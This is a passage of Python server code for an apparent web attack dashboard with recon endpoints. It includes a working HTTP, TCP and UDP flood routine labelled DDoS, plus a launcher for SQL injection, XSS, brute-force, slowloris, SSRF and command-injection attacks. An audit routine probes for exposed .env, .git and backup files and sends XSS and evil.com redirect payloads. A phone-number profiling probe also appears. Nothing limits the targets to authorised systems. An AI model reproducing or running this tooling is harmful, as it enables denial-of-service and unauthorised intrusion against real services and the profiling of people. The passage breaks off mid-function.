    return f"https://{target}"

async def target_audit(url: str, attack_id: str):
    """
    Pre-attack passive security audit. Sends real findings via WebSocket.
    Checks: security headers, CORS, info disclosure, clickjacking, admin panels,
    sensitive files, cookie flags, dangerous HTTP methods, TLS, error leakage.
    """
    base_url = format_url(url)
    host = re.sub(r'^https?://', '', base_url).split('/')[0].split(':')[0]
    ts = datetime.now().isoformat()

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[Audit] Running pre-attack recon on {host}...",
        "level": "info"
    }))

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:

            # ── 1. Fetch base response ──────────────────────────────
            try:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=10),
                                       allow_redirects=True,
                                       headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}) as resp:
                    headers = {k.lower(): v for k, v in resp.headers.items()}
                    body_raw = await resp.read()
                    body = body_raw[:8000].decode("utf-8", errors="replace").lower()
                    status = resp.status
            except Exception as e:
                await manager.broadcast(json.dumps({
                    "type": "log", "message": f"[Audit] Could not reach {host}: {e}", "level": "warning"
                }))
                return

            # ── 2. Security Headers ─────────────────────────────────
            missing_hdr = []
            sec_headers = {
                "strict-transport-security": ("HSTS Missing", "high",
                    "HSTS not set — browser can be downgraded from HTTPS to HTTP (MITM risk)"),
                "content-security-policy": ("No Content Security Policy", "high",
                    "CSP absent — XSS attacks have no browser-level mitigation"),
                "x-frame-options": ("Clickjacking Possible", "medium",
                    "X-Frame-Options missing — page can be embedded in <iframe> for clickjacking"),
                "x-content-type-options": ("MIME Sniffing Allowed", "medium",
                    "X-Content-Type-Options missing — browser may sniff content type (MIME confusion)"),
                "referrer-policy": ("Referrer Leakage", "low",
                    "Referrer-Policy not set — full URL may be leaked to third-party origins"),
                "permissions-policy": ("Permissions Policy Absent", "low",
                    "Permissions-Policy missing — browser features (camera, mic) unrestricted"),
            }
            for hdr, (vuln_type, severity, detail) in sec_headers.items():
                if hdr not in headers:
                    missing_hdr.append(hdr)
                    await _broadcast_finding({
                        "type": vuln_type, "severity": severity,
                        "url": base_url, "detail": detail,
                        "evidence": f"Header '{hdr}' absent from response",
                        "timestamp": ts, "attack_id": attack_id, "category": "headers"
                    })

            # ── 3. Server / Technology Disclosure ──────────────────
            for h in ("server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"):
                val = headers.get(h)
                if val and len(val) > 0:
                    await _broadcast_finding({
                        "type": "Server Information Disclosure", "severity": "medium",
                        "url": base_url,
                        "detail": f"Response exposes server tech: {h}: {val}",
                        "evidence": f"{h}: {val}",
                        "timestamp": ts, "attack_id": attack_id, "category": "disclosure"
                    })

            # ── 4. CORS Misconfiguration ────────────────────────────
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "")
            if acao == "*":
                await _broadcast_finding({
                    "type": "CORS Wildcard Origin", "severity": "medium",
                    "url": base_url,
                    "detail": "Access-Control-Allow-Origin: * allows any origin to read responses",
                    "evidence": f"ACAO: {acao}",
                    "timestamp": ts, "attack_id": attack_id, "category": "cors"
                })
            if acao == "*" and "true" in acac.lower():
                await _broadcast_finding({
                    "type": "CORS Wildcard + Credentials", "severity": "critical",
                    "url": base_url,
                    "detail": "ACAO: * with Allow-Credentials: true is an invalid but dangerous CORS config",
                    "evidence": f"ACAO: {acao} | ACAC: {acac}",
                    "timestamp": ts, "attack_id": attack_id, "category": "cors"
                })

            # ── 5. Cookie Security Flags ────────────────────────────
            set_cookie = headers.get("set-cookie", "")
            if set_cookie:
                flags = set_cookie.lower()
                if "httponly" not in flags:
                    await _broadcast_finding({
                        "type": "Cookie Missing HttpOnly Flag", "severity": "medium",
                        "url": base_url,
                        "detail": "Session cookie lacks HttpOnly — accessible via document.cookie (XSS risk)",
                        "evidence": set_cookie[:120],
                        "timestamp": ts, "attack_id": attack_id, "category": "cookies"
                    })
                if "secure" not in flags and "https" in base_url:
                    await _broadcast_finding({
                        "type": "Cookie Missing Secure Flag", "severity": "medium",
                        "url": base_url,
                        "detail": "Cookie lacks Secure flag — may be sent over HTTP connections",
                        "evidence": set_cookie[:120],
                        "timestamp": ts, "attack_id": attack_id, "category": "cookies"
                    })
                if "samesite" not in flags:
                    await _broadcast_finding({
                        "type": "Cookie Missing SameSite Flag", "severity": "low",
                        "url": base_url,
                        "detail": "Cookie lacks SameSite attribute — CSRF risk for state-changing requests",
                        "evidence": set_cookie[:120],
                        "timestamp": ts, "attack_id": attack_id, "category": "cookies"
                    })

            # ── 6. Dangerous HTTP Methods ───────────────────────────
            for method in ("TRACE", "PUT", "DELETE", "CONNECT"):
                try:
                    async with session.request(method, base_url,
                                               timeout=aiohttp.ClientTimeout(total=5)) as r:
                        if r.status not in (405, 501, 403, 400, 404):
                            await _broadcast_finding({
                                "type": f"Dangerous HTTP Method Allowed: {method}", "severity": "high",
                                "url": base_url,
                                "detail": f"Server accepted {method} request (status {r.status}) — may allow data manipulation or XST",
                                "evidence": f"HTTP {method} → {r.status}",
                                "timestamp": ts, "attack_id": attack_id, "category": "methods"
                            })
                except Exception:
                    pass

            # ── 7. Error / Info Leakage ─────────────────────────────
            error_probes = [
                (f"{base_url}/.git/HEAD", "Git Repository Exposed", "critical",
                 ".git/HEAD is publicly accessible — source code may be dumpable"),
                (f"{base_url}/.env", "Environment File Exposed", "critical",
                 ".env file accessible — may contain DB passwords, API keys, secrets"),
                (f"{base_url}/config.json", "Config File Exposed", "critical",
                 "config.json publicly accessible — may expose credentials or API keys"),
                (f"{base_url}/phpinfo.php", "PHP Info Page Exposed", "high",
                 "phpinfo() page accessible — exposes server config, paths, PHP version"),
                (f"{base_url}/admin", "Admin Panel Exposed", "high",
                 "Admin panel accessible without authentication check"),
                (f"{base_url}/wp-admin", "WordPress Admin Exposed", "high",
                 "WordPress admin login page accessible"),
                (f"{base_url}/server-status", "Apache Server Status Exposed", "high",
                 "Apache mod_status exposed — reveals active connections and server load"),
                (f"{base_url}/robots.txt", "Robots.txt Reveals Hidden Paths", "low",
                 "robots.txt found — may disclose sensitive directory paths"),
                (f"{base_url}/sitemap.xml", "Sitemap Exposed", "info",
                 "sitemap.xml found — reveals all indexed URLs"),
                (f"{base_url}/backup.zip", "Backup File Exposed", "critical",
                 "backup.zip accessible — may contain full application source or DB dump"),
                (f"{base_url}/api/v1/users", "API Users Endpoint Exposed", "high",
                 "Unauthenticated access to /api/v1/users — potential IDOR / data leak"),
                (f"{base_url}/swagger", "Swagger UI Exposed", "medium",
                 "Swagger/OpenAPI docs public — reveals all API endpoints and schemas"),
                (f"{base_url}/graphql", "GraphQL Endpoint Exposed", "medium",
                 "GraphQL endpoint public — introspection may reveal full schema"),
            ]

            for probe_url, vuln_type, severity, detail in error_probes:
                if not metrics["attacks_running"] and attack_id != "audit_only":
                    break
                try:
                    async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=5),
                                           allow_redirects=False) as pr:
                        if pr.status in (200, 206):
                            probe_body = (await pr.read())[:500].decode("utf-8", errors="replace")
                            # Filter false positives — check body has real content
                            if len(probe_body.strip()) > 20:
                                await _broadcast_finding({
                                    "type": vuln_type, "severity": severity,
                                    "url": probe_url, "detail": detail,
                                    "evidence": f"HTTP 200 — {probe_body[:120].strip()}",
                                    "timestamp": ts, "attack_id": attack_id, "category": "exposure"
                                })
                except Exception:
                    pass

            # ── 8. XSS Reflection Quick Check ──────────────────────
            xss_probe = "<script>alert(1)</script>"
            try:
                async with session.get(
                    f"{base_url}?q={xss_probe}",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as xr:
                    xr_body = (await xr.read())[:4000].decode("utf-8", errors="replace")
                    if xss_probe in xr_body or "alert(1)" in xr_body:
                        await _broadcast_finding({
                            "type": "Reflected XSS Confirmed", "severity": "critical",
                            "url": base_url,
                            "detail": "XSS payload reflected unescaped in response — script execution possible",
                            "payload": xss_probe,
                            "evidence": "Payload found verbatim in response body",
                            "timestamp": ts, "attack_id": attack_id, "category": "xss"
                        })
            except Exception:
                pass

            # ── 9. SQL Error Detection ──────────────────────────────
            sql_probe = "'"
            try:
                async with session.get(
                    f"{base_url}?id={sql_probe}",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as sr:
                    sr_body = (await sr.read())[:4000].decode("utf-8", errors="replace").lower()
                    sql_errors = ["sql syntax", "mysql_fetch", "ora-", "odbc driver", "sqlite",
                                  "pg_query", "unclosed quotation", "unterminated quoted string",
                                  "you have an error in your sql", "warning: mysql"]
                    for err in sql_errors:
                        if err in sr_body:
                            await _broadcast_finding({
                                "type": "SQL Injection Error Detected", "severity": "critical",
                                "url": base_url,
                                "detail": f"SQL error leaked in response to quote injection: '{err}' found in body",
                                "payload": sql_probe,
                                "evidence": sr_body[max(0, sr_body.index(err)-30):sr_body.index(err)+80],
                                "timestamp": ts, "attack_id": attack_id, "category": "sqli"
                            })
                            break
            except Exception:
                pass

            # ── 10. Open Redirect Check ─────────────────────────────
            redirect_probe = "https://evil.com"
            for param in ("url", "redirect", "next", "return", "goto", "redir"):
                try:
                    async with session.get(
                        f"{base_url}?{param}={redirect_probe}",
                        timeout=aiohttp.ClientTimeout(total=5),
                        allow_redirects=False
                    ) as rr:
                        loc = rr.headers.get("Location", "")
                        if "evil.com" in loc:
                            await _broadcast_finding({
                                "type": "Open Redirect Confirmed", "severity": "high",
                                "url": base_url,
                                "detail": f"Parameter '{param}' redirects to attacker-controlled URL",
                                "payload": f"?{param}={redirect_probe}",
                                "evidence": f"Location: {loc}",
                                "timestamp": ts, "attack_id": attack_id, "category": "redirect"
                            })
                            break
                except Exception:
                    pass

    except Exception as e:
        await manager.broadcast(json.dumps({
            "type": "log", "message": f"[Audit] Error during audit: {str(e)}", "level": "warning"
        }))

    n = len([v for v in metrics["vulnerabilities_found"] if v.get("attack_id") == attack_id])
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[Audit] Complete — {n} finding(s) identified on {host}",
        "level": "success" if n == 0 else "warning"
    }))


async def ip_stress_attack(ip: str, duration: int, intensity: int, threads: int, protocol: str, attack_id: str):
    """High-volume TCP/UDP/HTTP flood DDoS-style stress test against a raw IP."""
    FLOOD_PORTS = [80, 443, 8080, 8443]
    SCAN_PORTS  = [22, 21, 25, 53, 3306, 5432]
    start_time  = time.time()
    sent        = 0

    # ── Phase 1: HTTP flood (hits port 80 & 443 with real HTTP requests) ──
    async def http_flood():
        nonlocal sent
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "curl/7.68.0",
            "python-requests/2.28.0"
        ]
        async with aiohttp.ClientSession() as session:
            while time.time() - start_time < duration and metrics["attacks_running"]:
                for port in [80, 8080]:
                    scheme = "https" if port in (443, 8443) else "http"
                    # IPv6 addresses need bracket notation in URLs
                    ip_str = f"[{ip}]" if ":" in ip else ip
                    target_url = f"{scheme}://{ip_str}:{port}/"
                    try:
                        req_start = time.time()
                        headers = {"User-Agent": random.choice(ua_list)}
                        async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                            req_time = time.time() - req_start
                            metrics["total_requests"] += 1
                            metrics["successful_requests"] += 1
                            metrics["response_times"].append(req_time)
                            sent += 1
                            await manager.broadcast(json.dumps({
                                "type": "log",
                                "message": f"[DDoS] HTTP {ip}:{port} → {resp.status} ({req_time*1000:.0f}ms) | Total: {sent}",
                                "level": "success"
                            }))
                    except Exception:
                        metrics["total_requests"] += 1
                        metrics["failed_requests"] += 1
                        sent += 1
                        await manager.broadcast(json.dumps({
                            "type": "log",
                            "message": f"[DDoS] HTTP {ip}:{port} → BLOCKED/NO RESPONSE | Total: {sent}",
                            "level": "warning"
                        }))
                await asyncio.sleep(1.0 / max(intensity, 1))

    # ── Phase 2: Raw TCP SYN flood (rapid connection open/close) ──
    async def tcp_flood():
        nonlocal sent
        while time.time() - start_time < duration and metrics["attacks_running"]:
            port = random.choice(FLOOD_PORTS + SCAN_PORTS)
            try:
                req_start = time.time()
                conn = asyncio.open_connection(ip, port)
                reader, writer = await asyncio.wait_for(conn, timeout=1)
                # Immediately send garbage data then close — simulates SYN flood
                writer.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n" * 10)
                await writer.drain()
                req_time = time.time() - req_start
                writer.close()
                try: await writer.wait_closed()
                except: pass
                metrics["total_requests"] += 1
                metrics["successful_requests"] += 1
                metrics["response_times"].append(req_time)
                sent += 1
                await manager.broadcast(json.dumps({
                    "type": "log",
                    "message": f"[DDoS] TCP SYN {ip}:{port} → CONNECTED & FLOODED ({req_time*1000:.0f}ms) | Total: {sent}",
                    "level": "success"
                }))
            except Exception:
                metrics["total_requests"] += 1
                metrics["failed_requests"] += 1
                sent += 1
                await manager.broadcast(json.dumps({
                    "type": "log",
                    "message": f"[DDoS] TCP SYN {ip}:{port} → DROPPED | Total: {sent}",
                    "level": "warning"
                }))
            await asyncio.sleep(0.05)  # 20 attempts/sec per thread = high volume

    # ── Phase 3: UDP flood ──
    async def udp_flood():
        nonlocal sent
        payload = random.randbytes(512)  # 512-byte UDP payload
        while time.time() - start_time < duration and metrics["attacks_running"]:
            port = random.choice(FLOOD_PORTS + SCAN_PORTS)
            try:
                loop = asyncio.get_event_loop()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                await loop.sock_sendto(sock, payload, (ip, port))
                sock.close()
                metrics["total_requests"] += 1
                metrics["successful_requests"] += 1
                sent += 1
                await manager.broadcast(json.dumps({
                    "type": "log",
                    "message": f"[DDoS] UDP FLOOD {ip}:{port} → {len(payload)}B sent | Total: {sent}",
                    "level": "info"
                }))
            except Exception:
                metrics["total_requests"] += 1
                metrics["failed_requests"] += 1
                sent += 1
            await asyncio.sleep(0.02)  # 50 UDP packets/sec per thread

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[DDoS] Launching {threads} flood threads against {ip} for {duration}s — HTTP + TCP + UDP",
        "level": "warning"
    }))

    tasks = []
    for _ in range(threads):
        tasks.append(asyncio.create_task(http_flood()))
        if protocol in ("tcp", "both"):
            tasks.append(asyncio.create_task(tcp_flood()))
        if protocol in ("udp", "both"):
            tasks.append(asyncio.create_task(udp_flood()))
    await asyncio.gather(*tasks)

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[DDoS] Flood complete — {sent} total packets/requests sent to {ip}",
        "level": "success"
    }))


async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_id: str):
    """Multi-pass OSINT probe against a phone number — carrier, geo, validity, timezone."""
    if not phone.startswith("+") and phone.isdigit():
        phone = "+" + phone

    start_time = time.time()
    pass_num = 0
    LOOKUP_APIS = [
        f"https://api.cepaberto.com/v1/cep?cep={phone}",   # placeholder — always fails gracefully
    ]

    while time.time() - start_time < duration and metrics["attacks_running"]:
        pass_num += 1
        req_start = time.time()
        results = {"pass": pass_num, "target": phone, "valid": False}
        try:
            parsed = phonenumbers.parse(phone, None)
            results["valid"] = phonenumbers.is_valid_number(parsed)
            results["possible"] = phonenumbers.is_possible_number(parsed)
            results["country_code"] = parsed.country_code
            results["national_number"] = str(parsed.national_number)
            results["location"] = geocoder.description_for_number(parsed, "en")
            results["carrier"] = carrier.name_for_number(parsed, "en")
            results["timezones"] = list(timezone.time_zones_for_number(parsed))
            req_time = time.time() - req_start
            metrics["total_requests"] += 1
            metrics["successful_requests"] += 1
            metrics["response_times"].append(req_time)
            await manager.broadcast(json.dumps({
                "type": "log",
                "message": (
                    f"[Phone Probe #{pass_num}] {phone} | Valid={results['valid']} | "
                    f"Country=+{results['country_code']} | Location={results['location'] or 'N/A'} | "
                    f"Carrier={results['carrier'] or 'Unknown'} | TZ={', '.join(results['timezones'])}"
                ),
                "level": "success" if results["valid"] else "warning"
            }))
        except Exception as e:
            metrics["total_requests"] += 1
            metrics["failed_requests"] += 1
            await manager.broadcast(json.dumps({
                "type": "log",
                "message": f"[Phone Probe #{pass_num}] Parse error: {str(e)}",
                "level": "error"
            }))
        await asyncio.sleep(1.0 / max(intensity, 1))


async def run_attack_coordinator(req: AttackRequest, attack_id: str):
    metrics["attacks_running"] = True
    metrics["current_attacks"].append(req.attack_type)
    metrics["start_time"] = datetime.now().isoformat()

    # ── Real security audit runs first ───────────────────────────────
    await target_audit(req.url, attack_id)

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"Starting {req.attack_type.upper()} attack against {req.url}",
        "level": "info"
    }))
    await manager.broadcast(json.dumps({
        "type": "attack_status",
        "data": {"running": True, "attack_type": req.attack_type, "url": req.url, "completed": False}
    }))

    # Broadcast real-time metrics periodically in the background
    async def stats_broadcaster():
        while metrics["attacks_running"]:
            await manager.broadcast(json.dumps({
                "type": "metrics",
                "data": {
                    "total_requests": metrics["total_requests"],
                    "successful_requests": metrics["successful_requests"],
                    "failed_requests": metrics["failed_requests"],
                    "attack_id": attack_id
                }
            }))
            await asyncio.sleep(0.5)

    stats_task = asyncio.create_task(stats_broadcaster())

    try:
        if req.attack_type == "ddos":
            await ddos_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "sql":
            await sql_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "xss":
            await xss_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_xss_payload)
        elif req.attack_type == "stored_xss":
            await stored_xss_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_xss_payload)
        elif req.attack_type == "csrf":
            await csrf_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "brute":
            await brute_force_attack(req.url, req.duration, req.intensity, req.threads, req.username, req.wordlist, attack_id)
        elif req.attack_type == "port":
            await port_scan_attack(req.url, req.duration, req.intensity, req.target_port, attack_id)
        elif req.attack_type == "slowloris":
            await slowloris_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "traversal":
            await traversal_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "cmd":
            await cmd_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "ssrf":
            await ssrf_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "xxe":
            await xxe_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "idor":
            await idor_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "redirect":
            await open_redirect_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "header_inj":
            await header_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_header_payload)
        elif req.attack_type == "ip_stress":
            ip_target = req.url.strip()
            proto = "tcp"
            await ip_stress_attack(ip_target, req.duration, req.intensity, req.threads, proto, attack_id)
        elif req.attack_type == "phone_probe":
            phone_target = req.url.strip()
            await phone_probe_attack(phone_target, req.duration, req.intensity, attack_id)
    except Exception as e:
        await manager.broadcast(json.dumps({
            "type": "log",
            "message": f"Error running attack: {str(e)}",
            "level": "error"
        }))
    finally:
        metrics["attacks_running"] = False
        stats_task.cancel()
        if req.attack_type in metrics["current_attacks"]:
            metrics["current_attacks"].remove(req.attack_type)
        
        history_item = {
            "attack_id": attack_id,
            "attack_type": req.attack_type.upper(),
            "url": req.url,
            "duration": req.duration,
            "total_requests": metrics["total_requests"],
            "successful_requests": metrics["successful_requests"],
            "timestamp": datetime.now().isoformat()
        }
        async with metrics_lock:
            metrics["attack_history"].append(history_item)
            if len(metrics["attack_history"]) > 200:
                del metrics["attack_history"][:-200]
        
        await manager.broadcast(json.dumps({
            "type": "attack_status",
            "data": {
                "running": False,
                "attack_type": req.attack_type,
                "url": req.url,
                "completed": True,
                "total_requests": metrics["total_requests"],
                "successful_requests": metrics["successful_requests"],
                "timestamp": history_item["timestamp"]
            }
        }))

# Endpoints
@app.get("/", response_class=HTMLResponse)
async def serve_index():
    index_path = os.path.join(os.path.dirname(__file__), "index.html")
    if os.path.exists(index_path):
        with open(index_path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse(content="<h3>index.html not found!</h3>")

@app.get("/api/status")
async def get_status():
    return JSONResponse(content={
        "config": {
            "system_status": metrics["system_status"]
        },
        "stats": {
            "total_requests": metrics["total_requests"],
            "successful_requests": metrics["successful_requests"],
            "failed_requests": metrics["failed_requests"]
        },
        "attacks_running": metrics["attacks_running"],
        "current_attacks": metrics["current_attacks"],
        "vulnerabilities": metrics["vulnerabilities_found"],
        "history": metrics["attack_history"]
    })

@app.post("/api/attack/start", response_model=AttackResponse)
async def start_attack(req: AttackRequest, background_tasks: BackgroundTasks):
    if metrics["attacks_running"]:
        raise HTTPException(status_code=400, detail="An attack is already running.")
        
    attack_id = str(uuid.uuid4())
    # Start coordinator in background
    background_tasks.add_task(run_attack_coordinator, req, attack_id)
    return {"success": True, "message": "Attack initiated successfully.", "attack_id": attack_id}

@app.post("/api/attack/stop")
async def stop_attack():
    if not metrics["attacks_running"]:
        return JSONResponse(content={"success": False, "message": "No active attack to stop."})
        
    metrics["attacks_running"] = False
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Attack stop request received. Terminating all tasks...",
        "level": "warning"
    }))
    return JSONResponse(content={"success": True, "message": "Attack termination command sent."})

@app.post("/api/logs/clear")
async def clear_logs():
    async with metrics_lock:
        metrics["total_requests"] = 0
        metrics["successful_requests"] = 0
        metrics["failed_requests"] = 0
        metrics["response_times"] = []
        metrics["request_history"] = []
        metrics["vulnerabilities_found"] = []
        metrics["attack_history"] = []
    
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Metrics and activity logs cleared.",
        "level": "info"
    }))
    
    return JSONResponse(content={"success": True, "message": "Metrics cleared."})


# ── Self-Test Endpoint (targets user-provided IP) ────────────────
class SelfTestRequest(BaseModel):
    target_ip: str

@app.post("/api/selftest/start")
async def start_selftest(req_data: SelfTestRequest, background_tasks: BackgroundTasks):
    if metrics["attacks_running"]:
        raise HTTPException(status_code=400, detail="A test is already running.")
    attack_id = str(uuid.uuid4())
    req = AttackRequest(
        url=req_data.target_ip,
        attack_type="ip_stress",
        duration=30,
        intensity=10,
        threads=5
    )
    background_tasks.add_task(run_attack_coordinator, req, attack_id)
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[Self-Test] Firing IP stress test at {req_data.target_ip}...",
        "level": "warning"
    }))
    return JSONResponse(content={"success": True, "message": f"Self-test started against {req_data.target_ip}", "attack_id": attack_id})
# ── Recon Request Model ────────────────────────────────────────────────
class ReconRequest(BaseModel):
    target: str   # domain or URL

def extract_host(target: str) -> str:
    """Strip protocol and path, return bare hostname."""
    host = re.sub(r'^https?://', '', target.strip())
    host = host.split('/')[0].split(':')[0]
    return host

# ── 1. DNS Lookup ─────────────────────────────────────────────────────
@app.post("/api/recon/ip")
async def recon_ip(req: ReconRequest):
    target = req.target.strip()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{target}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return JSONResponse(content={"target": target, "ip_info": data})
                else:
                    return JSONResponse(content={"target": target, "error": f"HTTP {resp.status}"})
    except Exception as e:
        return JSONResponse(content={"target": target, "error": str(e)})

@app.post("/api/recon/phone")
async def recon_phone(req: ReconRequest):
    target = req.target.strip()
    # Add + if missing for parsing but only if it looks like numbers
    if not target.startswith("+") and target.isdigit():
        target = "+" + target
    
    results = {"target": target, "valid": False}
    try:
        parsed_num = phonenumbers.parse(target, None)
        results["valid"] = phonenumbers.is_valid_number(parsed_num)
        results["possible"] = phonenumbers.is_possible_number(parsed_num)
        results["country_code"] = parsed_num.country_code
        results["national_number"] = parsed_num.national_number
        results["location"] = geocoder.description_for_number(parsed_num, "en")
        results["carrier"] = carrier.name_for_number(parsed_num, "en")
        results["timezones"] = list(timezone.time_zones_for_number(parsed_num))
    except Exception as e:
        results["error"] = str(e)
        
    return JSONResponse(content={"phone_info": results})

@app.post("/api/recon/dns")
async def recon_dns(req: ReconRequest):
    host = extract_host(req.target)
    results = {}
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 5

    for rtype in record_types:
        try:
            answers = resolver.resolve(host, rtype)
            results[rtype] = [str(r) for r in answers]
        except Exception:
            results[rtype] = []

    return JSONResponse(content={"host": host, "records": results})

# ── 2. WHOIS Lookup ───────────────────────────────────────────────────
@app.post("/api/recon/whois")
async def recon_whois(req: ReconRequest):
    host = extract_host(req.target)
    # Use rdap (modern WHOIS replacement) via public API
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"https://rdap.org/domain/{host}",
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    registrant = {}
                    for entity in data.get("entities", []):
                        roles = entity.get("roles", [])
                        vcard = entity.get("vcardArray", [None, []])[1]
                        for item in vcard:
                            if item[0] == "fn":
                                registrant["name"] = item[3]
                            if item[0] == "email":
                                registrant["email"] = item[3]
                    return JSONResponse(content={
                        "host": host,
                        "registrar": data.get("entities", [{}])[0].get("handle", "N/A"),
                        "registrant": registrant,
                        "registered": data.get("events", [{}])[0].get("eventDate", "N/A"),
                        "expires": next((e["eventDate"] for e in data.get("events", []) if e.get("eventAction") == "expiration"), "N/A"),
                        "status": data.get("status", []),
                        "nameservers": [ns.get("ldhName", "") for ns in data.get("nameservers", [])]
                    })
    except Exception as e:
        pass
    return JSONResponse(content={"host": host, "error": "WHOIS lookup failed or domain not found."})

# ── 3. SSL / TLS Certificate Check ───────────────────────────────────
@app.post("/api/recon/ssl")
async def recon_ssl(req: ReconRequest):
    host = extract_host(req.target)
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(
            socket.create_connection((host, 443), timeout=6),
            server_hostname=host
        ) as ssock:
            cert = ssock.getpeercert()
            cipher = ssock.cipher()
            protocol = ssock.version()

        subject = dict(x[0] for x in cert.get("subject", []))
        issuer  = dict(x[0] for x in cert.get("issuer", []))
        sans    = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]

        return JSONResponse(content={
            "host": host,
            "valid": True,
            "subject": subject,
            "issuer": issuer,
            "issued_to": subject.get("commonName", host),
            "issued_by": issuer.get("organizationName", "Unknown"),
            "valid_from": cert.get("notBefore", ""),
            "valid_until": cert.get("notAfter", ""),
            "san": sans,
            "protocol": protocol,
            "cipher": cipher[0] if cipher else "Unknown",
            "bits": cipher[2] if cipher else 0
        })
    except ssl.SSLCertVerificationError as e:
        return JSONResponse(content={"host": host, "valid": False, "error": f"Certificate error: {str(e)}"})
    except Exception as e:
        return JSONResponse(content={"host": host, "valid": False, "error": str(e)})

# ── 4. HTTP Security Headers Audit ───────────────────────────────────
SECURITY_HEADERS = {
    "strict-transport-security": "HSTS — enforces HTTPS",
    "content-security-policy": "CSP — prevents XSS",
    "x-frame-options": "Clickjacking protection",
    "x-content-type-options": "MIME sniffing protection",
    "referrer-policy": "Controls referrer info leakage",
    "permissions-policy": "Controls browser feature access",
    "x-xss-protection": "Legacy XSS filter (deprecated but checked)",
    "access-control-allow-origin": "CORS policy",
    "cache-control": "Cache control directives",
    "x-powered-by": "⚠ Tech disclosure (should be removed)"
}

@app.post("/api/recon/headers")
async def recon_headers(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as resp:
                headers = dict(resp.headers)
                status  = resp.status

        audit = {}
        for header, desc in SECURITY_HEADERS.items():
            val = headers.get(header) or headers.get(header.title())
            audit[header] = {
                "present": val is not None,
                "value": val,
                "description": desc,
                "risk": "low" if val is not None else ("info" if header == "x-powered-by" else "high")
            }

        missing = [h for h, v in audit.items() if not v["present"] and h != "x-powered-by"]
        score   = int(((len(SECURITY_HEADERS) - len(missing)) / len(SECURITY_HEADERS)) * 100)

        return JSONResponse(content={
            "host": host,
            "url": url,
            "status": status,
            "security_score": score,
            "audit": audit,
            "missing_count": len(missing),
            "all_headers": {k: v for k, v in headers.items()}
        })
    except Exception as e:
        return JSONResponse(content={"host": host, "error": str(e)})

# ── 5. Technology Fingerprinting ─────────────────────────────────────
TECH_SIGNATURES = {
    "server": {
        "nginx":   "Nginx",
        "apache":  "Apache",
        "iis":     "Microsoft IIS",
        "cloudflare": "Cloudflare",
        "caddy":   "Caddy",
        "gunicorn":"Gunicorn (Python)",
        "uvicorn": "Uvicorn (FastAPI/Python)",
        "lighttpd":"Lighttpd"
    },
    "x-powered-by": {
        "php":     "PHP",
        "asp.net": "ASP.NET",
        "express": "Express.js (Node)",
        "django":  "Django (Python)",
        "rails":   "Ruby on Rails",
        "next.js": "Next.js"
    },
    "via": {
        "varnish": "Varnish Cache",
        "squid":   "Squid Proxy"
    },
    "cf-ray": {"": "Cloudflare CDN"},
    "x-vercel-id": {"": "Vercel Hosting"},
    "x-amz": {"": "AWS"},
    "x-cache": {"hit": "CDN / Caching Layer"}
}

@app.post("/api/recon/fingerprint")
async def recon_fingerprint(req: ReconRequest):
    url = format_url(req.target)
    host = extract_host(req.target)
    detected = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as resp:
                headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                body    = (await resp.text())[:4000].lower()
                status  = resp.status

